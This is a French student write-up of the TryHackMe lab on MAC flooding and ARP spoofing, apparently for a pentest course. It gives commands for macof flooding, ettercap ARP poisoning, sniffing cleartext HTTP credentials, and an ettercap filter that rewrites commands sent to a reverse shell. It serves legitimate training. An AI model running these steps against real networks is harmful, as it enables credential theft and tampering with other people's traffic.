# Challenge C503 18/03/2026

## 🧑‍🏫 Pitch de l’exercice

Le challenge du jour consiste à créer un compte sur TryHackMe, puis réaliser les labs suivants :

- Attaque ManInTheMiddle <https://tryhackme.com/room/layer2>

- Optionnel : Nmap <https://tryhackme.com/room/furthernmap>

[Cours C503.](/RESUME.md#️-c503---pentest-interne--outils-commandes-et-attaques-mitm)

> 📚 **Ressources** :
>

---

## 🥷 Résolution Lab ManInTheMiddle

[TryHackMe - L2 MAC Flooding & ARP Spoofing](https://tryhackme.com/room/layer2)

**Objectif de la room :** Comprendre et exploiter les vulnérabilités de la couche 2 (Liaison de données) d'un réseau local, en passant de l'écoute passive à la manipulation active de paquets (Man-in-the-Middle).

### 1️⃣ Accès Initial et Reconnaissance (Tasks 2 & 3)

La première étape consistait à se connecter à la machine compromise et à cartographier le réseau interne inconnu sur la deuxième carte réseau (`eth1`).

- **`ssh admin@10.130.x.x`** : Connexion à la machine d'attaque via le protocole SSH.
- **`ip a show eth1`** : Affichage des paramètres de l'interface réseau pour identifier notre adresse IP locale et le sous-réseau (CIDR `/24`).
- **`sudo nmap -sn 192.168.12.0/24`** : Ping scan (découverte d'hôtes) pour identifier les adresses IP actives d'Alice et Bob sans scanner leurs ports.

### 2️⃣ Écoute passive et MAC Flooding (Tasks 4 & 5)

Sur un réseau moderne, les switchs isolent le trafic. Pour écouter les conversations des autres, il a fallu saturer le switch pour le forcer à agir comme un simple Hub (mode *fail-open*).

- **`sudo tcpdump -i eth1 -w /tmp/tcpdump.pcap`** : Lancement d'une capture réseau passive sauvegardée dans un fichier `.pcap`.
- **`sudo macof -i eth1`** : Inondation du switch avec des milliers d'adresses MAC aléatoires pour saturer sa table CAM et forcer la diffusion de tout le trafic sur tous les ports.
- **`scp admin@10.130.x.x:/tmp/tcpdump.pcap .`** : Rapatriement sécurisé du fichier de capture vers la machine locale pour l'analyser confortablement avec **Wireshark** (et y trouver le fameux payload de 666 bytes !).

![icmp](/images/2026-03-18-19-06-02.png)

### 3️⃣ ARP Spoofing et Interception de mots de passe (Tasks 6 & 7)

Après avoir constaté que l'attaque échouait sur un réseau protégé (qui valide les paquets ARP), l'attaque a été relancée sur un sous-réseau vulnérable pour usurper l'identité des machines.

- **`sudo nmap -sS IP_Alice IP_Bob`** : Scan furtif pour découvrir les services ouverts (un serveur web sur le port 80 pour Bob, un port suspect 4444 pour Alice).

![port80](/images/2026-03-18-20-06-43.png)

- **`sudo ettercap -T -i eth1 -M arp`** : Lancement de l'attaque ARP Spoofing (Man-in-the-Middle) en mode texte (`-T`) pour empoisonner le cache ARP d'Alice et Bob.
- **`sudo tcpdump -i eth1 port 80 -A`** : Écoute du trafic HTTP intercepté avec affichage en texte clair (`-A`), ce qui a permis de voler les identifiants `admin:xxxxx_xxxx`.

![serveur](/images/2026-03-18-20-22-12.png)

### 4️⃣ Exploitation et Manipulation de paquets (Tasks 8 & 9)

La phase finale ! Alice avait un accès distant (Reverse Shell) sur le serveur de Bob. Le but n'était plus seulement d'écouter, mais de modifier ses commandes à la volée.

- **`curl -u admin:xxxxx_xxxx http://IP/user.txt`** : Utilisation des identifiants volés précédemment pour récupérer le premier flag sur le serveur web.

![flag](/images/2026-03-18-20-32-39.png)

- **Création du filtre (`whoami.ecf`)** : Écriture d'un script demandant à Ettercap de remplacer la chaîne de caractères "whoami" par "cat root.txt" dans les paquets TCP transitant sur le port 4444.
- **`etterfilter whoami.ecf -o whoami.ef`** : Compilation du filtre texte en un fichier lisible par Ettercap.
- **`sudo ettercap -T -i eth1 -M arp -F whoami.ef`** : Lancement de l'attaque MITM finale avec le filtre activé (`-F`), forçant l'affichage du flag `root.txt` dans la console d'écoute `tcpdump` !

![flag2](/images/2026-03-18-20-50-12.png)

![done](/images/2026-03-18-20-51-20.png)

---

## 🕵️ Résolution Lab Nmap

[TryHackMe - Nmap](https://tryhackme.com/room/furthernmap)
